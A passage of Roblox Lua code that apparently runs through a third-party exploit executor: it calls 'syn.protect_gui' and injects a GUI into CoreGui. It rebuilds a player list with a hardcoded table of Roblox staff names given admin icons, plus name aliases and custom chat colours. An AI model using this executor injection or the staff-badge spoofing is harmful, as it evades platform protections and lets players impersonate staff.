		local separatingLine = Instance.new("Frame",dragBar)
		separatingLine.Name = "SeparatingLine"
		separatingLine.BackgroundColor3 = Color3.new(115/255,115/255,115/255)
		separatingLine.BorderSizePixel = 0
		separatingLine.Position = UDim2.new(1,-18,0.5,-7)
		separatingLine.Size = UDim2.new(0,1,0,14)

		local otherSeparatingLine = separatingLine:clone()
		otherSeparatingLine.Position = UDim2.new(1,-35,0.5,-7)
		otherSeparatingLine.Parent = dragBar

		local widgetContainer = Instance.new("Frame",dragBar)
		widgetContainer.Name = "WidgetContainer"
		widgetContainer.BackgroundTransparency = 1
		widgetContainer.Position = UDim2.new(0,0,1,0)
		widgetContainer.BorderColor3 = Color3.new(0,0,0)
		if not scrollable then
			widgetContainer.BackgroundTransparency = 0
			widgetContainer.BackgroundColor3 = Color3.new(72/255,72/255,72/255)
		end

		if size then
			if scrollable then
				widgetContainer.Size = size
			else
				widgetContainer.Size = UDim2.new(0,dragBar.AbsoluteSize.X,size.Y.Scale,size.Y.Offset)
			end
		else
			if scrollable then
				widgetContainer.Size = UDim2.new(0,163,0,400)
			else
				widgetContainer.Size = UDim2.new(0,dragBar.AbsoluteSize.X,0,400)
			end
		end
		if position then
			widgetContainer.Position = position + UDim2.new(0,0,0,20)
		end

		local frame,control,verticalDragger = nil
		if scrollable then
			--frame for widgets
			frame,control = t.CreateTrueScrollingFrame()
			frame.Size = UDim2.new(1, 0, 1, 0)
			frame.BackgroundColor3 = Color3.new(72/255,72/255,72/255)
			frame.BorderColor3 = Color3.new(0,0,0)
			frame.Active = true
			frame.Parent = widgetContainer
			control.Parent = dragBar
			control.BackgroundColor3 = Color3.new(72/255,72/255,72/255)
			control.BorderSizePixel = 0
			control.BackgroundTransparency = 0
			control.Position = UDim2.new(1,-21,1,1)
			if size then
				control.Size = UDim2.new(0,21,size.Y.Scale,size.Y.Offset)
			else
				control.Size = UDim2.new(0,21,0,400)
			end
			control:FindFirstChild("ScrollDownButton").Position = UDim2.new(0,0,1,-20)

			local fakeLine = Instance.new("Frame",control)
			fakeLine.Name = "FakeLine"
			fakeLine.BorderSizePixel = 0
			fakeLine.BackgroundColor3 = Color3.new(0,0,0)
			fakeLine.Size = UDim2.new(0,1,1,1)
			fakeLine.Position = UDim2.new(1,0,0,0)

			verticalDragger = Instance.new("TextButton",widgetContainer)
			verticalDragger.ZIndex = 2
			verticalDragger.AutoButtonColor = false
			verticalDragger.Name = "VerticalDragger"
			verticalDragger.BackgroundColor3 = Color3.new(50/255,50/255,50/255)
			verticalDragger.BorderColor3 = Color3.new(0,0,0)
			verticalDragger.Size = UDim2.new(1,20,0,20)
			verticalDragger.Position = UDim2.new(0,0,1,0)
			verticalDragger.Active = true
			verticalDragger.Text = ""

			local scrubFrame = Instance.new("Frame",verticalDragger)
			scrubFrame.Name = "ScrubFrame"
			scrubFrame.BackgroundColor3 = Color3.new(1,1,1)
			scrubFrame.BorderSizePixel = 0
			scrubFrame.Position = UDim2.new(0.5,-5,0.5,0)
			scrubFrame.Size = UDim2.new(0,10,0,1)
			scrubFrame.ZIndex = 5
			local scrubTwo = scrubFrame:clone()
			scrubTwo.Position = UDim2.new(0.5,-5,0.5,-2)
			scrubTwo.Parent = verticalDragger
			local scrubThree = scrubFrame:clone()
			scrubThree.Position = UDim2.new(0.5,-5,0.5,2)
			scrubThree.Parent = verticalDragger

			local areaSoak = Instance.new("TextButton",getLayerCollectorAncestor(parent))
			areaSoak.Name = "AreaSoak"
			areaSoak.Size = UDim2.new(1,0,1,0)
			areaSoak.BackgroundTransparency = 1
			areaSoak.BorderSizePixel = 0
			areaSoak.Text = ""
			areaSoak.ZIndex = 10
			areaSoak.Visible = false
			areaSoak.Active = true

			local draggingVertical = false
			local startYPos = nil
			verticalDragger.MouseEnter:connect(function ()
				verticalDragger.BackgroundColor3 = Color3.new(60/255,60/255,60/255)
			end)
			verticalDragger.MouseLeave:connect(function ()
				verticalDragger.BackgroundColor3 = Color3.new(50/255,50/255,50/255)
			end)
			verticalDragger.MouseButton1Down:connect(function(x,y)
				draggingVertical = true
				areaSoak.Visible = true
				startYPos = y
			end)
			areaSoak.MouseButton1Up:connect(function (  )
				draggingVertical = false
				areaSoak.Visible = false
			end)
			areaSoak.MouseMoved:connect(function(x,y)
				if not draggingVertical then return end

				local yDelta = y - startYPos
				if not control.ScrollDownButton.Visible and yDelta > 0 then
					return
				end

				if (widgetContainer.Size.Y.Offset + yDelta) < 150 then
					widgetContainer.Size = UDim2.new(widgetContainer.Size.X.Scale, widgetContainer.Size.X.Offset,widgetContainer.Size.Y.Scale,150)
					control.Size = UDim2.new (0,21,0,150)
					return 
				end 

				startYPos = y

				if widgetContainer.Size.Y.Offset + yDelta >= 0 then
					widgetContainer.Size = UDim2.new(widgetContainer.Size.X.Scale, widgetContainer.Size.X.Offset,widgetContainer.Size.Y.Scale,widgetContainer.Size.Y.Offset + yDelta)
					control.Size = UDim2.new(0,21,0,control.Size.Y.Offset + yDelta )
				end
			end)
		end

		local function switchMinimize()
			minimizeFrame.Visible = not minimizeFrame.Visible
			if scrollable then
				frame.Visible = not frame.Visible
				verticalDragger.Visible = not verticalDragger.Visible
				control.Visible = not control.Visible
			else
				widgetContainer.Visible = not widgetContainer.Visible
			end

			if minimizeFrame.Visible then
				minimizeButton.Text = "+"
			else
				minimizeButton.Text = "-"
			end
		end

		minimizeBigButton.MouseButton1Click:connect(function (  )
			switchMinimize()
		end)

		minimizeButton.MouseButton1Click:connect(function(  )
			switchMinimize()
		end)

		if scrollable then
			return dragBar, frame, helpFrame, closeEvent
		else
			return dragBar, widgetContainer, helpFrame, closeEvent
		end
	end

	t.Help = 
		function(funcNameOrFunc) 
		--input argument can be a string or a function.  Should return a description (of arguments and expected side effects)
		if funcNameOrFunc == "CreatePropertyDropDownMenu" or funcNameOrFunc == t.CreatePropertyDropDownMenu then
			return "Function CreatePropertyDropDownMenu.  " ..
				"Arguments: (instance, propertyName, enumType).  " .. 
				"Side effect: returns a container with a drop-down-box that is linked to the 'property' field of 'instance' which is of type 'enumType'" 
		end 
		if funcNameOrFunc == "CreateDropDownMenu" or funcNameOrFunc == t.CreateDropDownMenu then
			return "Function CreateDropDownMenu.  " .. 
				"Arguments: (items, onItemSelected).  " .. 
				"Side effect: Returns 2 results, a container to the gui object and a 'updateSelection' function for external updating.  The container is a drop-down-box created around a list of items" 
		end 
		if funcNameOrFunc == "CreateMessageDialog" or funcNameOrFunc == t.CreateMessageDialog then
			return "Function CreateMessageDialog.  " .. 
				"Arguments: (title, message, buttons). " .. 
				"Side effect: Returns a gui object of a message box with 'title' and 'message' as passed in.  'buttons' input is an array of Tables contains a 'Text' and 'Function' field for the text/callback of each button"
		end		
		if funcNameOrFunc == "CreateStyledMessageDialog" or funcNameOrFunc == t.CreateStyledMessageDialog then
			return "Function CreateStyledMessageDialog.  " .. 
				"Arguments: (title, message, style, buttons). " .. 
				"Side effect: Returns a gui object of a message box with 'title' and 'message' as passed in.  'buttons' input is an array of Tables contains a 'Text' and 'Function' field for the text/callback of each button, 'style' is a string, either Error, Notify or Confirm"
		end
		if funcNameOrFunc == "GetFontHeight" or funcNameOrFunc == t.GetFontHeight then
			return "Function GetFontHeight.  " .. 
				"Arguments: (font, fontSize). " .. 
				"Side effect: returns the size in pixels of the given font + fontSize"
		end
		if funcNameOrFunc == "LayoutGuiObjects" or funcNameOrFunc == t.LayoutGuiObjects then

		end
		if funcNameOrFunc == "CreateScrollingFrame" or funcNameOrFunc == t.CreateScrollingFrame then
			return "Function CreateScrollingFrame.  " .. 
				"Arguments: (orderList, style) " .. 
				"Side effect: returns 4 objects, (scrollFrame, scrollUpButton, scrollDownButton, recalculateFunction).  'scrollFrame' can be filled with GuiObjects.  It will lay them out and allow scrollUpButton/scrollDownButton to interact with them.  Orderlist is optional (and specifies the order to layout the children.  Without orderlist, it uses the children order. style is also optional, and allows for a 'grid' styling if style is passed 'grid' as a string.  recalculateFunction can be called when a relayout is needed (when orderList changes)"
		end
		if funcNameOrFunc == "CreateTrueScrollingFrame" or funcNameOrFunc == t.CreateTrueScrollingFrame then
			return "Function CreateTrueScrollingFrame.  " .. 
				"Arguments: (nil) " .. 
				"Side effect: returns 2 objects, (scrollFrame, controlFrame).  'scrollFrame' can be filled with GuiObjects, and they will be clipped if not inside the frame's bounds. controlFrame has children scrollup and scrolldown, as well as a slider.  controlFrame can be parented to any guiobject and it will readjust itself to fit."
		end
		if funcNameOrFunc == "AutoTruncateTextObject" or funcNameOrFunc == t.AutoTruncateTextObject then
			return "Function AutoTruncateTextObject.  " .. 
				"Arguments: (textLabel) " .. 
				"Side effect: returns 2 objects, (textLabel, changeText).  The 'textLabel' input is modified to automatically truncate text (with ellipsis), if it gets too small to fit.  'changeText' is a function that can be used to change the text, it takes 1 string as an argument"
		end
		if funcNameOrFunc == "CreateSlider" or funcNameOrFunc == t.CreateSlider then
			return "Function CreateSlider.  " ..
				"Arguments: (steps, width, position) " ..
				"Side effect: returns 2 objects, (sliderGui, sliderPosition).  The 'steps' argument specifies how many different positions the slider can hold along the bar.  'width' specifies in pixels how wide the bar should be (modifiable afterwards if desired). 'position' argument should be a UDim2 for slider positioning. 'sliderPosition' is an IntValue whose current .Value specifies the specific step the slider is currently on."
		end
		if funcNameOrFunc == "CreateSliderNew" or funcNameOrFunc == t.CreateSliderNew then
			return "Function CreateSliderNew.  " ..
				"Arguments: (steps, width, position) " ..
				"Side effect: returns 2 objects, (sliderGui, sliderPosition).  The 'steps' argument specifies how many different positions the slider can hold along the bar.  'width' specifies in pixels how wide the bar should be (modifiable afterwards if desired). 'position' argument should be a UDim2 for slider positioning. 'sliderPosition' is an IntValue whose current .Value specifies the specific step the slider is currently on."
		end
		if funcNameOrFunc == "CreateLoadingFrame" or funcNameOrFunc == t.CreateLoadingFrame then
			return "Function CreateLoadingFrame.  " ..
				"Arguments: (name, size, position) " ..
				"Side effect: Creates a gui that can be manipulated to show progress for a particular action.  Name appears above the loading bar, and size and position are udim2 values (both size and position are optional arguments).  Returns 3 arguments, the first being the gui created. The second being updateLoadingGuiPercent, which is a bindable function.  This function takes one argument (two optionally), which should be a number between 0 and 1, representing the percentage the loading gui should be at.  The second argument to this function is a boolean value that if set to true will tween the current percentage value to the new percentage value, therefore our third argument is how long this tween should take. Our third returned argument is a BindableEvent, that when fired means that someone clicked the cancel button on the dialog."
		end
		if funcNameOrFunc == "CreateTerrainMaterialSelector" or funcNameOrFunc == t.CreateTerrainMaterialSelector then
			return "Function CreateTerrainMaterialSelector.  " ..
				"Arguments: (size, position) " ..
				"Side effect: Size and position are UDim2 values that specifies the selector's size and position.  Both size and position are optional arguments. This method returns 3 objects (terrainSelectorGui, terrainSelected, forceTerrainSelection).  terrainSelectorGui is just the gui object that we generate with this function, parent it as you like. TerrainSelected is a BindableEvent that is fired whenever a new terrain type is selected in the gui.  ForceTerrainSelection is a function that takes an argument of Enum.CellMaterial and will force the gui to show that material as currently selected."
		end
	end

	return t
end
local gui = Instance.new("ScreenGui")
syn.protect_gui(gui)
gui.Parent = game.CoreGui
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
local fakescript = Instance.new("LocalScript")
fakescript.Parent = gui
function makegui()
	game:GetService("StarterGui"):SetCoreGuiEnabled("PlayerList", false) -- Ctrl+F "API DOCS" to get the docs
	local script = fakescript
	--settings.  Don't make these local.
	ALLOW_BC_ICONS = true

	CUSTOM_CHAT_COLORS = { -- add your name = Color3 to give yourself a custom chat color.
		-- if you don't choose a chat color, but you do add a custom icon, your color will appear as golden
		-- if you don't want golden but you do want an icon, you can set your chat color to Color3.new(1,1,1)
		arceusinator = Color3.new(0, 150/255, 200/255)
	}

	ADMINS =
		{ 
			Wingedgames = 1,
			arceusinator = 1,
			aceswayuphigh = 1,
			adamintygum = 1,
			afackler11 = 1,
			aleverns = 1,
			aquabot8 = 1,
			arbolito = 1,
			argforpirates = 1,
			argonpirate = 1,
			asmohdian = 1,
			bellavour = 1,
			blockhaak = 1,
			brighteyes = 1,
			briguy9876 = 1,
			builderman = 1,
			cdakkar = 1,
			chiefjustus = 1,
			chro = 1,
			cmed = 1,
			coatp0cketninja = 1,
			codewriter = 1,
			commandercrow = 1,
			corgiparade = 1,
			dapperbuffalo = 1,
			dbapostle = 1,
			deeana00 = 1,
			doughtless = 1,
			dunbar1138 = 1,
			echodown = 1,
			ffjosh = 1,
			foyle = 1,
			fusroblox = 'http://www.roblox.com/asset/?id=99852703',
			gemlocker = 1,
			goddessnoob = 1,
			gongfutiger = 1,
			gordonrox24 = 1,
			gorroth = 1,
			grossinger = 1,
			groundcontroll2 = 1,
			hawkeyebandit = 1,
			hawkington = 1,
			ibanez2189 = 1,
			iltalumi = 1,
			inventx = 1,
			jeditkacheff = 1,
			kbux = 1,
			keith = 1,
			limon = 1,
			loopylens = 1,
			lordrugdumph = 1,
			majortom4321 = 1,
			malcomso = 1,
			maxvee = 1,
			midwinterfires = 1,
			mistersquirrel = 1,
			morganic = 1,
			motornerve = 1,
			mrdoombringer = 1,
			mse6 = 1,
			newtrat = 1,
			niquemonster = 1,
			nobledragon = 1,
			noob007 = 1,
			nrawat1 = 1,
			olive71 = 1,
			onlytwentycharacters = 1,
			orcasparkles = 1,
			ostrichsized = 1,
			phaedre = 1,
			phil = 1,
			pulmoesflor = 1,
			raeglyn = 1,
			rbadam = 1,
			reesemcblox = 1,
			robliu = 1,
			roblowilson = 1,
			robloxsai = 1,
			roboyz = 1,
			saurauss = 1,
			screenme = 1,
			scubasomething = 1,
			seanthornton = 1,
			shedletsky = 'http://www.roblox.com/asset/?id=105897927',
			sickenedmonkey = 1,
			slingshotjunkie = 1,
			smeaferblox = 1,
			soggoth = 1,
			solarcrane = 1,
			sooraya = 1,
			sorcus = 'http://www.roblox.com/asset/?id=113059239',
			squidcod = 1,
			stickmasterluke = 1,
			stuball = 1,
			tabemono = 1,
			tarabyte = 1,
			thelorekt = 1,
			thorasaur = 1,
			timobius = 1,
			tobotrobot = 1,
			tone = 1,
			totallynothere = 1,
			totbl = 1,
			twberg = 1,
			vaiobot = 1,
			varia = 1,
			vladthefirst = 1,
			wonderboy76 = 1,
			xerolayne = 1,
			yesth = 1,
			yumyumcheerios = 1,
			zeuxcg = 1,
			zodiaczak = 1,
			['erik.cassel'] = 1,
			['david.baszucki'] = 1,
			['matt dusek'] = 1,
		}

	ALIASES = {
		arceusinator = "arceusinator",
		player1 = "Player1",
		Wingedgames = "Wingedgames"
	}

	-- API DOCS
	-- _G.PlayerListAPI:SetAllowBCIcons(true or false)
	-- :AddAdmin(String name, Optional Content customIcon)
	-- :RemoveAdmin(String name)
	-- :SetAlias(String name, String alias)
	-- _G.ChatAPI:SendChat(String playername, String message, Color3 customcolor)

	for name,a in pairs(ADMINS) do
		ADMINS[name:lower()] = a
	end
	for name,a in pairs(CUSTOM_CHAT_COLORS) do
		CUSTOM_CHAT_COLORS[name:lower()] = a
	end
	for name,a in pairs(ALIASES) do
		ALIASES[name:lower()] = a
	end

	function GetAliasOf(name)
		return ALIASES[name:lower()] or name
	end

	local export = {}

	export.SetAllowBCIcons = function(self, b)
		ALLOW_BC_ICONS = b
	end

	export.AddAdmin = function(self, name, customicon)
		ADMINS[name:lower()] = customicon or 1
	end

	export.RemoveAdmin = function(self, name)
		ADMINS[name:lower()] = 0
	end

	export.GetChatData = function(self)
		return ADMINS, CUSTOM_CHAT_COLORS, ALIASES
	end

	export.SetAlias = function(self, name, alias)
		if alias == "" or alias == nil then
			ALIASES[name:lower()] = name
		else
			ALIASES[name:lower()] = alias
		end
	end

	export.GetAlias = function(self, name)
		return GetAliasOf(name)
	end

	_G.PlayerListAPI = export

	local Images = {
		bottomDark = '94691904',
		bottomLight = '94691940',
		midDark = '94691980',
		midLight = '94692025',
		LargeDark = '96098866',
		LargeLight = '96098920',
		LargeHeader = '96097470',
		NormalHeader = '94692054',
		LargeBottom = '96397271',
		NormalBottom = '94754966',
		DarkBluePopupMid = '97114905',
		LightBluePopupMid = '97114905',
		DarkPopupMid = '97112126',
		LightPopupMid = '97109338',
		DarkBluePopupTop = '97114838',
		DarkBluePopupBottom = '97114758',
		DarkPopupBottom = '100869219',
		LightPopupBottom = '97109175',
	}

	local BASE_TWEEN = .25 

	local MOUSE_HOLD_TIME = .15
	local MOUSE_DRAG_DISTANCE = 15

--[[
	Generic object Create function, which I am using to create Gui's 
	Thanks to Stravant! 
--]]
	local Obj = {}
	function Obj.Create(guiType)
		return function(data)
			local obj = Instance.new(guiType)
			for k, v in pairs(data) do
				if type(k) == 'number' then
					v.Parent = obj
				else
					obj[k] = v
				end
			end
			return obj
		end
	end 

--[[
	makes a full sized background for a guiobject
	@Args:
	imgName		asset name of image to fill background
	@Return:	background gui object
--]]
	function MakeBackgroundGuiObj(imgName)
		return Obj.Create'ImageLabel'
		{
			Name = 'Background',
			BackgroundTransparency = 1,
			Image = imgName,
			Position = UDim2.new(0, 0, 0, 0),
			Size = UDim2.new(1,0,1,0),
		}
	end
	--[[ turns 255 integer color value to a color3 --]]
	function Color3I(r,g,b)
		return Color3.new(r/255,g/255,b/255)
	end

--[[
	Gets correct icon for builder's club status to display by name
	@Args:
	membershipType		Enum of membership status
	@Return: 			string of image asset
--]]
	function getMembershipTypeIcon(membershipType,playerName)
		if ADMINS[string.lower(playerName)]~=nil then
			if ADMINS[string.lower(playerName)] == 1 then
				return "http://www.roblox.com/asset/?id=99727663"
			else
				local dat = ADMINS[string.lower(playerName)]

				if type(dat) == "table" then
					return dat[1]
				elseif type(dat) == "string" then
					return ADMINS[string.lower(playerName)]
				else
					return "http://www.roblox.com/asset/?id=99727663"
				end
			end
		elseif membershipType == Enum.MembershipType.None then
			return ""
		elseif membershipType == Enum.MembershipType.BuildersClub then
			return "rbxasset://textures/ui/TinyBcIcon.png"
		elseif membershipType == Enum.MembershipType.TurboBuildersClub then
			return "rbxasset://textures/ui/TinyTbcIcon.png"
		elseif membershipType == Enum.MembershipType.OutrageousBuildersClub then
			return "rbxasset://textures/ui/TinyObcIcon.png"
		else
			error("Unknown membershipType" .. membershipType)
		end	
	end

	local function getFriendStatusIcon(friendStatus)
		if friendStatus == Enum.FriendStatus.Unknown or friendStatus == Enum.FriendStatus.NotFriend then
			return ""
		elseif friendStatus == Enum.FriendStatus.Friend then
			return "http://www.roblox.com/asset/?id=99749771"
		elseif friendStatus == Enum.FriendStatus.FriendRequestSent then
			return "http://www.roblox.com/asset/?id=99776888"
		elseif friendStatus == Enum.FriendStatus.FriendRequestReceived then
			return "http://www.roblox.com/asset/?id=99776838"
		else
			error("Unknown FriendStatus: " .. friendStatus)
		end
	end


--[[
	Utility function to create buttons for the popup menus
	@Args:
	nparent		what to parent this button to
	ntext		text to put on this button
	index		number index of this entry in menu
	last		is this the last element of the popup menu
	@Return:	a popup menu button
--]]
	function MakePopupButton(nparent,ntext,index,last)
		local tobj = Obj.Create"ImageButton"
		{
			Name = 'ReportButton',
			BackgroundTransparency = 1,
			Position = UDim2.new(0,0,1*index,0),
			Size = UDim2.new(1, 0, 1, 0),
			ZIndex=7,
			Obj.Create'TextLabel'
			{
				Name = 'ButtonText',
				BackgroundTransparency = 1,
				Position = UDim2.new(.07, 0, .07, 0),
				Size = UDim2.new(.86,0,.86,0),
				Parent = HeaderFrame,
				Font = 'ArialBold',
				Text = ntext,
				FontSize = 'Size14',
				TextScaled = true,
				TextColor3 = Color3.new(1,1,1),
				TextStrokeTransparency = 1,
				ZIndex=7,
			},
			Parent = nparent,
		}
		if index==0 then
			tobj.Image = 'http://www.roblox.com/asset/?id=97108784'
		elseif last then
			if index%2==1 then
				tobj.Image = 'http://www.roblox.com/asset/?id='.. Images['LightPopupBottom']
			else
				tobj.Image = 'http://www.roblox.com/asset/?id='.. Images['DarkPopupBottom']
			end
		else
			if index%2==1 then
				tobj.Image = 'http://www.roblox.com/asset/?id=97112126'
			else
				tobj.Image = 'http://www.roblox.com/asset/?id=97109338'
			end
		end
		return tobj
	end


--[[
	obligatory wait for child function
	@Args:
	parent		Parent object to look for child in
	child		name of child object to look for
	@Return: object waited for
--]]
	function WaitForChild(parent,child)
		while not parent:FindFirstChild(child) do
			wait() debugprint(" child "..parent.Name.." waiting for "..child)
		end
		return parent[child]
	end

	---------------------------  
	-- Workspace Objects
	--------------------------- 

	-- might want to move all this to an init function, wait for localplayer elsewhere
	local Players = game:GetService('Players')
	-- make sure this doesn't run on the server(it will if you dont do this)
	while not Players.LocalPlayer do
		Players.Changed:wait() 
	end

	local LocalPlayer = Players.LocalPlayer
	local Mouse = LocalPlayer:GetMouse()

	local ScreenGui = Obj.Create"Frame"
	{
		Name = 'PlayerListScreen',
		Size = UDim2.new(1, 0, 1, 0),
		BackgroundTransparency = 1,
		Parent = script.Parent 
	}
	local MainFrame = Obj.Create"Frame"
	{
		Name = 'LeaderBoardFrame',
		Position = UDim2.new(1, -150, 0.005, 0),
		Size = UDim2.new(0, 150, 0, 800),
		BackgroundTransparency = 1,
		Parent = ScreenGui,
	}

	--frame used for expanding leaderstats when frame is 'focused'
	local FocusFrame = Obj.Create"Frame"
	{
		Name = 'FocusFrame',
		Position = UDim2.new(0, 0, 0, 0),
		Size = UDim2.new(1, 0, 0, 100),
		BackgroundTransparency = 1,
		Active = true,
		Parent = MainFrame,
	}

	local TemplateFrameYSize = 0.670000017

	-- HEADER
	local HeaderFrame = Obj.Create"Frame"
	{
		Name = 'Header',
		BackgroundTransparency = 1,
		Position = UDim2.new(0,0,0,0),
		Size = UDim2.new(1, 0, .07, 0),
		Parent = MainFrame,
		MakeBackgroundGuiObj('http://www.roblox.com/asset/?id=94692054'),
	}
	local HeaderFrameHeight = HeaderFrame.Size.Y.Scale
	local MaximizeButton = Obj.Create"ImageButton"
	{
		Name = 'MaximizeButton',
		Active = true,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 0, 0, 0),
		Size = UDim2.new(1,0,1,0),
		Parent = HeaderFrame,
	}
	local HeaderName = Obj.Create"TextLabel"
	{
		Name = 'PlayerName',
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 0, .01, 0),
		Size = UDim2.new(.98,0,.38,0),
		Parent = HeaderFrame,
		Font = 'ArialBold',
		Text = GetAliasOf(LocalPlayer.Name),
		FontSize='Size24',
		--TextScaled = true,
		TextColor3 = Color3.new(1,1,1),
		TextStrokeColor3 = Color3.new(0,0,0),
		TextStrokeTransparency = 0,
		TextXAlignment = 'Right',
		TextYAlignment = 'Center',
	}
	local HeaderScore = Obj.Create"TextLabel"
	{
		Name = 'PlayerScore',
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 0, .4, 0),
		Size = UDim2.new(.98,0,0,30),
		Parent = HeaderFrame,
		Font = 'ArialBold',
		Text = '',
		FontSize='Size24',
		TextYAlignment = 'Top',
		--TextScaled = true,
		TextColor3 = Color3.new(1,1,1),
		TextStrokeTransparency = 1,
		TextXAlignment = 'Right',
		TextYAlignment = 'Top',
	}

	coroutine.resume(coroutine.create(function() while wait(1) do
			HeaderFrame.PlayerName.Text = GetAliasOf(LocalPlayer.Name)
		end end))
	-- BOTTOM
	--used for shifting bottom frame for mouse over effects
	local BottomShiftFrame = Obj.Create"Frame"
	{
		Name= 'BottomShiftFrame',
		BackgroundTransparency = 1,
		Position = UDim2.new(0,0,HeaderFrameHeight,0),
		Size = UDim2.new(1,0,1,0),
		Parent=MainFrame,
	}
	local BottomFrame = Obj.Create"Frame"
	{
		Name = 'Bottom',
		BackgroundTransparency = 1,
		Position = UDim2.new(0,0,.07,0),
		Size = UDim2.new(1, 0, .03, 0),
		Parent = BottomShiftFrame,
		MakeBackgroundGuiObj('http://www.roblox.com/asset/?id=94754966'),
	}
	local ExtendButton = Obj.Create"ImageButton"
	{
		Name = 'bigbutton',
		Active = true,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 0, 0, 0),
		Size = UDim2.new(1,0,1.5,0),
		ZIndex = 3,
		Parent = BottomFrame,
	}
	local ExtendTab = Obj.Create"ImageButton"
	{
		Name = 'extendTab',
		Active = true,
		BackgroundTransparency = 1,
		Image = 'http://www.roblox.com/asset/?id=94692731',
		Position = UDim2.new(.608, 0, .3, 0),
		Size = UDim2.new(.3,0,.7,0),
		Parent = BottomFrame,
	}
	local TopClipFrame = Obj.Create"Frame"
	{
		Name = 'ListFrame',
		BackgroundTransparency = 1,
		Position = UDim2.new(-1,0,.07,0),
		Size = UDim2.new(2, 0, 1, 0),
		Parent = MainFrame,
		ClipsDescendants = true,
	}
	local BottomClipFrame = Obj.Create"Frame"
	{
		Name = 'BottomFrame',
		BackgroundTransparency = 1,
		Position = UDim2.new(0,0, - .8,0),
		Size = UDim2.new(1, 0, 1, 0),
		Parent = TopClipFrame,
		ClipsDescendants = true,
	}
	local ScrollBarFrame = Obj.Create"Frame"
	{
		Name = 'ScrollBarFrame',
		BackgroundTransparency = 1,
		Position = UDim2.new(.987,0,.8,0),
		Size = UDim2.new(.01, 0, .2, 0),
		Parent = BottomClipFrame,
	}
	local ScrollBar = Obj.Create"Frame"
	{
		Name = 'ScrollBar',
		BackgroundTransparency = 0,
		BackgroundColor3 = Color3.new(.2,.2,.2),
		Position = UDim2.new(0,0,0,0),
		Size = UDim2.new(1, 0, .5, 0),
		ZIndex = 5,
		Parent = ScrollBarFrame,

	}
	local ListFrame = Obj.Create"Frame"
	{
		Name = 'SubFrame',
		BackgroundTransparency = 1,
		Position = UDim2.new(0,0,.8,0),
		Size = UDim2.new(1, 0, 1, 0),
		Parent = BottomClipFrame,
	}
	local PopUpClipFrame = Obj.Create"Frame"
	{
		Name = 'PopUpFrame',
		BackgroundTransparency = 1,
		SizeConstraint='RelativeXX',
		Position = MainFrame.Position + UDim2.new( 0,-150,0,0),
		Size = UDim2.new(0,150,0,800),
		Parent = MainFrame,
		ClipsDescendants = true,
		ZIndex=7,
	}
	local PopUpPanel = nil
	local PopUpPanelTemplate = Obj.Create"Frame"
	{
		Name = 'Panel',
		BackgroundTransparency = 1,
		Position = UDim2.new(1,0,0,0),
		Size = UDim2.new(1,0,.032,0),
		Parent = PopUpClipFrame,
	}

	local StatTitles = Obj.Create"Frame"
	{
		Name = 'StatTitles',
		BackgroundTransparency = 1,
		Position = UDim2.new(0,0,1,-10),
		Size = UDim2.new(1, 0, 0, 0),
		Parent = HeaderFrame,
	}

	local IsMinimized = Instance.new('BoolValue')
	local IsMaximized = Instance.new('BoolValue')
	local IsTabified = Instance.new('BoolValue')
	local AreNamesExpanded = Instance.new('BoolValue')


	local MiddleTemplate = Obj.Create"Frame"
	{
		Name = 'MidTemplate',
		BackgroundTransparency = 1,
		Position = UDim2.new(100,0,.07,0),
		Size = UDim2.new(.5, 0, .025, 0),--UDim2.new(1, 0, .03, 0),
		Obj.Create'ImageLabel'
		{
			Name = 'BCLabel',
			Active = true,
			BackgroundTransparency = 1,
			Position = UDim2.new(.005, 5, .20, 0),
			Size = UDim2.new(0,16,0,16),
			SizeConstraint = 'RelativeYY',
			Image = "",
			ZIndex = 3,
		},
		Obj.Create'ImageLabel'
		{
			Name = 'FriendLabel',
			Active = true,
			BackgroundTransparency = 1,
			Position = UDim2.new(.005, 5, .15, 0),
			Size = UDim2.new(0,16,0,16),
			SizeConstraint = 'RelativeYY',
			Image = "",
			ZIndex = 3,
		},
		Obj.Create"ImageButton"
		{
			Name = 'ClickListener',
			Active = true,
			BackgroundTransparency = 1,
			Position = UDim2.new(.005, 1, 0, 0),
			Size = UDim2.new(.96,0,1,0),
			ZIndex = 3,
		},
		Obj.Create"Frame"
		{
			Name = 'TitleFrame',
			BackgroundTransparency = 1,
			Position = UDim2.new(.01, 0, 0, 0),
			Size = UDim2.new(0,140,1,0),
			ClipsDescendants=true,
			Obj.Create"TextLabel"
			{
				Name = 'Title',
				BackgroundTransparency = 1,
				Position = UDim2.new(0, 5, 0, 0),
				Size = UDim2.new(100,0,1,0),
				Font = 'Arial',
				FontSize='Size14',
				TextColor3 = Color3.new(1,1,1),
				TextXAlignment = 'Left',
				TextYAlignment = 'Center',
				ZIndex = 3,
			},
		},

		Obj.Create"TextLabel"
		{
			Name = 'PlayerScore',
			BackgroundTransparency = 1,
			Position = UDim2.new(0, 0, 0, 0),
			Size = UDim2.new(1,0,1,0),
			Font = 'ArialBold',
			Text = '',
			FontSize='Size14',
			TextColor3 = Color3.new(1,1,1),
			TextXAlignment = 'Right',
			TextYAlignment = 'Center',
			ZIndex = 3,
		},
		--Obj.Create'IntValue'{Name = 'ID'},
		--Obj.Create'ObjectValue'{Name = 'Player'},
		--Obj.Create'IntValue'{Name = 'Score'},	
		ZIndex = 3,
	}
	local MiddleBGTemplate = Obj.Create"Frame"
	{
		Name = 'MidBGTemplate',
		BackgroundTransparency = 1,
		Position = UDim2.new(100,0,.07,0),
		Size = UDim2.new(.5, 0, .025, 0),--UDim2.new(1, 0, .03, 0),
		MakeBackgroundGuiObj('http://www.roblox.com/asset/?id=94692025'),

	}

	-- REPORT ABUSE OBJECTS

	local ReportAbuseShield = Obj.Create"TextButton"
	{
		Name = "ReportAbuseShield",
		Text = "",
		AutoButtonColor = false,
		Active = true,
		Visible = true,
		Size = UDim2.new(1,0,1,0),
		BackgroundColor3 = Color3I(51,51,51),
		BorderColor3 = Color3I(27,42,53),
		BackgroundTransparency = 1,
	}

	local ReportAbuseFrame = Obj.Create "Frame"
	{
		Name = "ReportAbuseFrame",
		Position = UDim2.new(0.5, -250, 0.5, -100),
		Size = UDim2.new(0, 500, 0, 200),
		ZIndex = 9,
		Parent = ReportAbuseShield,
		Style = "RobloxRound"
	}

	local ReportAbuseClose = Obj.Create "TextButton"
	{
		BackgroundColor3 = Color3.new(150/255, 0, 0),
